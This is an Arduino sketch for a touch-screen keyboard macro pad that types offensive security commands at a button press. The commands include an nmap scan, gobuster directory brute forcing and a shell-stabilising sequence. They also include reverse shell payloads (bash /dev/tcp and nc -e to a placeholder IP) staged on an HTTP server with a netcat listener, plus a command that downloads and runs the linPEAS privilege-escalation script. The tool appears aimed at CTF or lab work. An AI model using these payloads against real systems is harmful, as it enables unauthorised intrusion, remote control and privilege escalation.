/*
 * Arduino Leonardo Pro Micro
 * Nextion Display
 * Requires the Nextion Library modified to do software serial
 */

#include <Keyboard.h>
#include "Nextion.h"
SoftwareSerial HMISerial(8,9);

// Declare buttons      (page, ID, name)
NexButton b0 = NexButton(0, 1, "b0");
NexButton b1 = NexButton(0, 2, "b1");
NexButton b2 = NexButton(0, 3, "b2");
NexButton b3 = NexButton(0, 4, "b3");
NexButton b4 = NexButton(0, 5, "b4");
NexButton b5 = NexButton(0, 6, "b5");

// add buttons to list of events
NexTouch *nex_listen_list[] = 
{
  &b0,
  &b1,
  &b2,
  &b3,
  &b4,
  &b5
};

void slowWrite(char s_source[], int ln) {
  size_t length = strlen(s_source);
  size_t i = 0; 
  for (; i < length; i++) {
    Keyboard.print(s_source[i]);
    delay(random(100));
  }
  if (ln == 1) {
    Keyboard.println();
  }
  delay(100);
  }

void b0PopCallback(void *ptr){
 // NMAP
 //Keyboard.print("mkdir nmap & nmap -sC -sV -v -p-  -oA nmap/nmap");
 slowWrite("mkdir nmap & nmap -sC -sV -v -p-  -oA nmap/nmap", 0);
 delay(500);
}

void b1PopCallback(void *ptr){
  // PIMP SHELL
  slowWrite("python -c 'import pty; pty.spawn(\"/bin/bash\")'", 1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();
  delay(500);
  slowWrite("stty raw -echo", 1);
  delay(500);
  slowWrite("fg", 1);
  Keyboard.println("");
  delay(500);
  slowWrite("export TERM=xterm-256color", 1);
  //Keyboard.println("stty rows 100 cols 100");
}

void b2PopCallback(void *ptr){
  // GOBUSTER
  //Keyboard.print("gobuster dir -w /usr/share/wordlists/dirb/common.txt -u");
  slowWrite("gobuster dir -w /usr/share/wordlists/dirb/common.txt -u", 0);
  delay(500);
}

void b3PopCallback(void *ptr){
  // Reverse shells party
  slowWrite("mkdir rev_shells_party", 1);
  delay(500);
  slowWrite("echo \"bash -c 'bash -i >& /dev/tcp/(IP)/9001 0>&1'\" > rev_shells_party/bash.sh", 1);
  delay(500);
  slowWrite("echo \"nc -e /bin/sh (IP) 9001\" > rev_shells_party/nc.sh", 1);
  delay(500);
  slowWrite("sed -i \"s/(IP)/$(echo $(hostname -I) ",0);
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('1');
  Keyboard.releaseAll();
  slowWrite("tac -s' ' ", 0);
  Keyboard.press(KEY_RIGHT_ALT);
  Keyboard.press('1');
  Keyboard.releaseAll();
  slowWrite("head -1)/g\" rev_shells_party/*",1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  slowWrite("tmux", 1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('b');
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('"');
  Keyboard.releaseAll();
  delay(1000);
  slowWrite("nc -lvp 9001", 1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('b');
  Keyboard.releaseAll();
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();
  delay(500);
  slowWrite("sudo python -m http.server 80 --directory rev_shells_party/", 1);
}

void b4PopCallback(void *ptr){
  // BASH REVERSE SHELL
  slowWrite("tmux", 1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('b');
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('"');
  Keyboard.releaseAll();
  delay(1000);
  slowWrite("nc -lvp 9001", 1);
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('b');
  Keyboard.releaseAll();
  Keyboard.press(KEY_UP_ARROW);
  Keyboard.releaseAll();
  delay(500);
  //Keyboard.println("bash -c 'bash -i >& /dev/tcp/192.168.49.204/9001 0>&1'");
  slowWrite("bash -c 'bash -i >& /dev/tcp/IP/9001 0>&1'", 0);
  delay(500);
}

void b5PopCallback(void *ptr){
  // LINPEAS
  //Keyboard.println("curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh && sh linpeas.sh");
  slowWrite("curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh && sh linpeas.sh", 1);
  delay(500);
}

void setup() {
  // Start the software serial
  HMISerial.begin(9600);
  HMISerial.write(0xff);
  HMISerial.write(0xff);
  HMISerial.write(0xff);
  b0.attachPop(b0PopCallback);
  b1.attachPop(b1PopCallback);
  b2.attachPop(b2PopCallback);
  b3.attachPop(b3PopCallback);
  b4.attachPop(b4PopCallback);
  b5.attachPop(b5PopCallback);
}

void loop() {
  nexLoop(nex_listen_list);  // Check for any touch event
  delay(5); // for stability
}
